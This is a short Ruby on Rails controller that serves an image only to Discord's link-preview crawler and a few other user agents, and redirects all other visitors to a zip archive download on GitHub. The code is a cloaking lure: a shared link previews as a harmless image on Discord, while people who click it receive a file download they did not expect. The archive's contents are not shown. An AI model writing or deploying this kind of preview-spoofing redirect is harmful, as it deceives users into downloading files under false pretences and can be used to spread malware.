class GifsController < ApplicationController
  def show
    p request.user_agent
    if request.user_agent.include?('Discordbot') || request.user_agent.include?('discordapp') || request.user_agent.include?('Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0')
      send_file('app/assets/images/msga.png', type: 'image/png', disposition: 'inline')
    else
      redirect_to 'https://github.com/mrcreepysos/msga/archive/refs/heads/main.zip', allow_other_host: true
    end
  end
end